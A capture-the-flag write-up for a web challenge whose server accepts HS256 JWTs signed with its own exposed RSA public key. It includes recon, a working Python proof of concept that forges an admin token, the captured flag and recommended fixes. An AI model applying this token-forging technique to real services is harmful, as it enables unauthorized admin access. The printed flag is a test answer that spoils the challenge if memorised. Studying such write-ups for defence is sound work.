
# Time is Money - Web CTF Writeup

- Name: Time is money
- Target: http://116.202.106.156:5008/
- Category: Web

## Challenge Hint

> Trust is a vulnerability. The server is generous with what it shares, so use its own words against it and walk through the door marked admin only.

## Recon

Initial endpoint probing:

1. `GET /` returns plain text:
   `Time is Money Trading Platform. User login at /login. Flags at /api/flag.`
2. `POST /login` is allowed (`GET /login` returns `405`).
3. `GET /api/flag` returns `401` with:
   `{"msg":"Missing token"}`
4. `GET /jwks.json` returns a PEM-encoded RSA public key.

This strongly indicates token-based auth (JWT-style) with publicly exposed key material.

## Root Cause Discovery

The vulnerable behavior is JWT algorithm confusion:

1. Tokens with `alg: none` are rejected.
2. Tokens with `alg: HS256` are accepted if signed with HMAC.
3. Using the server-exposed RSA public key text from `/jwks.json` as the HMAC secret works.
4. `role` claim controls admin access (`role: "admin"` passes).

So the server trusts attacker-controlled `alg` and mixes asymmetric key material into symmetric verification logic.

## Exploit Steps

1. Fetch `/jwks.json` and copy the public key bytes.
2. Build JWT header:
   `{"alg":"HS256","typ":"JWT"}`
3. Build payload with admin role, for example:
   `{"username":"admin","role":"admin"}`
4. Sign `base64url(header) + "." + base64url(payload)` using HMAC-SHA256 with the public key as secret.
5. Send request:
   - Method: `GET`
   - URL: `/api/flag`
   - Header: `Authorization: Bearer <forged_token>`

## PoC Script

```python
import base64
import json
import hmac
import hashlib
import urllib.request

BASE = "http://116.202.106.156:5008"


def b64url(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()


# 1) Fetch exposed public key
pubkey = urllib.request.urlopen(BASE + "/jwks.json", timeout=10).read()

# 2) Craft forged JWT
header = {"alg": "HS256", "typ": "JWT"}
payload = {"username": "admin", "role": "admin"}

h = b64url(json.dumps(header, separators=(",", ":")).encode())
p = b64url(json.dumps(payload, separators=(",", ":")).encode())
message = f"{h}.{p}".encode()
signature = hmac.new(pubkey, message, hashlib.sha256).digest()
token = f"{h}.{p}.{b64url(signature)}"

# 3) Access protected endpoint
req = urllib.request.Request(
    BASE + "/api/flag",
    headers={"Authorization": "Bearer " + token},
)

print(urllib.request.urlopen(req, timeout=10).read().decode())
```

## Flag

`CIPH{t1m1ng_4nd_typ3_c0nfusi0n_m4st3r_2026}`

## Why This Worked

- The backend likely expected RSA verification but accepted `HS256` from the untrusted JWT header.
- The public key was exposed by design at `/jwks.json` and reused in a way that let attackers forge valid HMAC signatures.
- Authorization depended on user-provided claims (`role`) without robust server-side trust boundaries.

## Recommended Fixes

1. Hardcode accepted JWT algorithms server-side (for example, only `RS256`).
2. Never trust token `alg` header to select verification behavior.
3. Keep symmetric and asymmetric verification code paths completely separate.
4. Validate claims strictly (`iss`, `aud`, `exp`, `nbf`) and derive roles from trusted server-side identity data.
5. Add negative tests for `HS256`/`none` confusion and claim tampering.
